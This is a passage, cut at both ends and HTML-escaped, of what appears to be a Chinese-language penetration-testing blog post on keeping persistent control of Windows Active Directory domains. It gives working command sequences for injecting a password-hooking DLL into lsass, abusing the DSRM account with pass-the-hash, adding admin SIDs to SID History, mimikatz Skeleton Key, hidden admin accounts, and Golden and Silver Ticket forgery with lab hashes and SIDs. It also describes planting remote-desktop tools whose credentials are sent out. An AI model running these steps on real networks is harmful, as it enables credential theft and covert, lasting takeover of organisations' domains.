&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NseW1iM3IvTWlzYy1XaW5kb3dzLUhhY2tpbmc=&#34;&gt;https://github.com/clymb3r/Misc-Windows-Hacking&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;powershell -exec bypass -Command &amp;quot;&amp;amp; &amp;#123;Import-Module &#39;C:\Invoke-ReflectivePEInjection.ps1&#39;;Invoke-ReflectivePEInjection -PEPath C:\HookPasswordChange. dll -procname lsass&amp;#125;&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;机制账号启用dsrm&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#机制账号启用dsrm&#34;&gt;#&lt;/a&gt; 机制账号启用 DSRM&lt;/h4&gt;
&lt;p&gt;利用系统自带机制模式 DSRM，修改 DSRM 默认登录方式和属性，通过其同步 krgtgt 进行 PTH 攻击，实现持续化控制，但适用于系统 &amp;gt;=windows server2008。每个域控制器都有本地管理员账号和密码（与域管理员账号和密码不同）。DSRM 账号可以作为一个域控制器的本地管理员用户，通过网络连接域控制器，进而控制域控制器。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取dsrm及krbtgt的NTLM &lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;privilege::debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lsadump::lsa /patch /name:krbtgt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;token::elevate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lsadump::sam&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;dsrm&amp;amp;krbtgt&amp;amp;NTLM &lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;同步&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NTDSUTIL：打开ntdsutil&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set DSRM password：修改DSRM的密码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sync from domain account 域用户名字：使DSRM的密码和指定域用户的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;密码同步&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;(第 1 次)：退出DSRM密码设置模式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;(第 2 次)：退出ntdsutil&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;修改dsrm登录方式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;New-ItemProperty &amp;quot;hklm:\system\currentcontrolset\control\lsa\\&amp;quot; -name &amp;quot;dsrmadminlogonbehavior&amp;quot; -value 2 -propertyType DWORD&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用PTH传递攻击&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;privilege::debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sekurlsa::pth /domain:owa2010cn-god /user:administrator /ntlm:b097d7ed9749&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5408e1537f706c357fc5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir \\owa2010cn-god\c$&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;用户属性修改&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用户属性修改&#34;&gt;#&lt;/a&gt; 用户属性修改&lt;/h4&gt;
&lt;p&gt;把域控管理员的 SID 加入到其他某个恶意的域账户的 SID History 中，然后这个恶意的（我们自己创建的）域账户就可以域管理员权限访问域控了，不修改域账户一直存在。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取某用户SID属性&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Import-Module ActiveDirectory&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Get-ADUser webadmin -Properties sidhistory&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;给予某用户administrator属性&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;privilege::debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sid::patch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sid::add /sam:webadmin /new:administrator&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;测评给与前后的DC访问权限：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir \\192.168.3.21\c$&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;登录进程劫持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#登录进程劫持&#34;&gt;#&lt;/a&gt; 登录进程劫持&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;因为Skeleton Key技术是被注入到lsass.exe进程的，所以它只存在内存中，如域控重启，万能密码将失效。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;测试域内某个用户与DC通讯&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir \\owa2010cn-god\c$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;连接DC后，DC注入lsass进程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net use \\192.168.3.21\ipc$ &amp;quot;Admin12345&amp;quot; /user:god\administrator&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;privilege::debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;misc::skeleton&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;重新测试域内某个用户与DC通讯&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net use \\owa2010cn-god\ipc$ &amp;quot;mimikatz&amp;quot; /user:god\administrator&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir \\owa2010cn-god\c$&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;隐藏域管用户&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#隐藏域管用户&#34;&gt;#&lt;/a&gt; 隐藏域管用户&lt;/h4&gt;
&lt;p&gt;项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3dncHNlYy9DcmVhdGVIaWRkZW5BY2NvdW50&#34;&gt;https://github.com/wgpsec/CreateHiddenAccount&lt;/span&gt;&lt;br&gt;
 控制面板能查看到，命令查看看不到，单机版无法删除，域环境可以删除。&lt;br&gt;
CreateHiddenAccount -u xiaodi -p Xiaodi!@#45&lt;/p&gt;
&lt;h4 id=&#34;黄金票据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#黄金票据&#34;&gt;#&lt;/a&gt; 黄金票据&lt;/h4&gt;
&lt;p&gt;黄金票据生成攻击，是生成有效的 TGT Kerberos 票据，并且不受 TGT 生命周期的影响（TGT 默认 10 小时，最多续订 7 天），这里可以为任意用户生称黄金票据，然后为域管理员生成 TGT，这样普通用户就可以变成域管理员。&lt;/p&gt;
&lt;p&gt;已经拿下域管理员，获取到 krbtgt hash; 利用 krbtgt 的 hash 制作黄金票据 工具，进行攻击。该攻击方式其实是一种后门的形式，属于第二次进行攻击的 方法。第一次拿到域管权限之后，需要将 krbtgt NTLM hash 进行保存，当第二 次再来进行域渗透攻击时，我们就可使用 krbtgt 的 NTLM hash 制作黄金票据， 从而再次获得域管权限。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取域名，域sid值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;域名：god.org，域SID值：S-1-5-21-1218902331-2157346161-1782232778&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;whoami /user&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;whoami /all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmic useraccount get name,sid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取krbtgt的ntlm：域的KRBTGT账户NTLM-HASH：b097d7ed97495408e1537f706c357fc5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz privilege::debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz lsadump::lsa /patch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;伪造用户名：webadmin（任意用户名）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成票据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz kerberos::golden /user:webadmin /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /krbtgt:b097d7ed97495408e1537f706c357fc5 /ticket:g&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;导入内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz kerberos::ptt g&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;访问测试&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir \\owa2010cn-god\c$&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;白银票据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#白银票据&#34;&gt;#&lt;/a&gt; 白银票据&lt;/h4&gt;
&lt;p&gt;白银票据 (SILVER TICKET) 是利用域的服务账户进行伪造的 ST，在 Ker beros 认证的第三步，Client 带着 ST 和 Authenticator3 向 Server 上的某个服务进 行请求，Server 接收到 Client 的请求之后，通过自己的 Master Key 解密 ST， 从而获得 Session Key。所以只需要知道 Server 用户的 Hash 就可以伪造出一个 ST，且不会经过 KDC，但是伪造的门票只对部分服务起作用 (不需要交互 KDC，需要知道 Server 的 NTLM Hash)。&lt;/p&gt;
&lt;p&gt;已经拿下域管理员，获取到 DC hash；利用 DC 的 hash 制作白银票据工具，进行攻击。伪造的 ST，只能访问指定的服务，如 CIFS；不与 KDC 交互，直接&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;访问Server；ST由服务账号 NTLM Hash 加密。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取域名，域sid值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;域名：god.org、域SID值：S-1-5-21-1218902331-2157346161-1782232778&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;whoami /user&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;whoami /all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmic useraccount get name,sid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取dc账户的ntlm：域DC账户NTLM-HASH：82779569ef27d72b88b6c93dd8b37299&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz privilege::debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz sekurlsa::logonpasswords&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;伪造用户名：webadmin（任意用户名）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;导入票据：（CIFS文件共享服务）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;domain：域名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sid：域环境下的SID，除去最后-的部分剩下的内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target：要访问的服务器，写FQDN&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rc4：写的是目标主机的NTLM（主机名$对应NTLM）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;service：要访问的资源类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;user：伪造的用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cifs：共享文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz kerberos::golden /user:webadmin /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /target:owa2010cn-god /service:cifs /rc4:82779569ef27d72b88b6c93dd8b37299 /ptt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;上传白名单工具&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#上传白名单工具&#34;&gt;#&lt;/a&gt; 上传白名单工具&lt;/h4&gt;
&lt;p&gt;横向移动在上传木马的时候，将这两款软件直接上传上去，powershell 读配置文件将连接账户和密码发送至外边，进行连接！&lt;/p&gt;
&lt;p&gt;GotoHTTP：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9nb3RvaHR0cC5jb20vZ290by9kb3dubG9hZC4xMng=&#34;&gt;https://gotohttp.com/goto/download.12x&lt;/span&gt;&lt;br&gt;
RustDesk：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3J1c3RkZXNrL3J1c3RkZXNr&#34;&gt;https://github.com/rustdesk/rustdesk&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;有网连接：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;C:\Users\用户名\AppData\Roaming\RustDesk\config&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;其中ID和密码在RustDesk.toml文件里。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;无网内网连接：IP直连&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RustDesk2.toml&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;direct-server = &amp;#x27;Y&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;direct-access-port = 